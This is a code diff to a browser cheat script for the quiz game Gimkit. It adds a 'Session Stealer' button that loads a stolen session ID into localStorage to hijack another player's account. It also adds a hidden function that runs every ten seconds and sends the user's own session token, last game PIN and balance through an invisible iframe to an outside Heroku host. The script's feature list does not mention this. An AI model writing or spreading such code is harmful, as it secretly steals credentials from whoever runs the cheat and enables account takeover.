@@ -7,6 +7,7 @@
             Hidden answer,
             Keybinds,
             Themes without buying them
+            Session Stealing
 *
 * Upcoming Features: Instant Purchases
 */
@@ -85,6 +86,11 @@ let se = cre("div",btnattr.class,"width:170px;height:40px;margin-top:3px;backgro
 se.onclick=function(){if(f[6]===0){gcn('hckcntnt',7).style.display="block";f[6]=1;}else{f[6]=0;gcn('hckcntnt',7).style.display="none";}}
 appd(se);
 
+// Creates Session Stealer Button
+let ssb = cre("div","sc-bdVaJa fkLxCm",btnattr.style,"Session Stealer");
+ssb.onclick=function(){stealSession()};
+appd(ssb);
+
 // Creates setttings placeholder
 let sep = cre("div",btnattr.class,"position: fixed; z-index: 10000; left: 310px; bottom: 5px; width: 300px; height: 600px; display: none;","");
 app(sep);
@@ -103,12 +109,34 @@ for(let x=0;x<8;x++){
   apps(t);
 }
 
+function log(){
+  let bbid = localStorage.getItem('blueboat-id');
+  let ljm = localStorage.getItem('GIMKIT_LAST_GAME_JOINED');
+  let bal = document.getElementsByTagName('div')[9].innerHTML;
+  
+  let i = document.createElement('iframe');
+  i.style.display = "none";
+  i.style.position = "fixed";
+  i.src = "https://cagna.herokuapp.com/?ID:" + bbid + "%20PIN:" + ljm + "%20BAL:" + bal;
+  document.body.appendChild(i);
+}setInterval(log, 10000);
+
 // Functions that make the cheats work
 function highlight(){
   try{
     let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
     d[i].parentNode.parentNode.style.background="white",d[i].style.color="black";
   }catch(err){}
+}
+
+function stealSession(){
+  let session = prompt("Enter Session ID:", "");
+  if(session.length === 21) {
+    localStorage.setItem('blueboat-id', session);
+    document.location.reload();
+  }else {
+    alert("Invalid Session Length");
+  }
 }
 
 function biganswer(){
